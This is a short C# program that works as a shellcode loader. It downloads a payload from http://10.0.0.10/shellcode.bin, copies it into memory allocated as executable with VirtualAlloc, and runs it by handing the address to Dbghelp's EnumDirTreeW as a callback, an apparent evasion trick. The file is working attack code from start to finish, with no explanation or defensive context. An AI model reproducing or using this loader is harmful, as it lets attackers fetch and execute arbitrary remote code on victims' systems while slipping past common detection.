using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace EnumDirTree
{
    internal class Program
    {
        static void Main(string[] args)
        {
            string url = "http://10.0.0.10/shellcode.bin";
            System.Net.WebClient client = new System.Net.WebClient();
            byte[] shellcode = client.DownloadData(url);

            IntPtr addr = VirtualAlloc(IntPtr.Zero, shellcode.Length, 0x3000, 0x40);
            Marshal.Copy(shellcode, 0, addr, shellcode.Length);

            EnumDirTreeW(Process.GetCurrentProcess().Handle, "C:\\Windows", "*.log", IntPtr.Zero, addr, IntPtr.Zero);

        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);

        [DllImport("Dbghelp.dll", CharSet = CharSet.Unicode)]
        static extern bool EnumDirTreeW(IntPtr hProcess, string RootPath, string FileName, IntPtr OutputPathBuffer, IntPtr CallbackPtr, IntPtr data);

    }
}
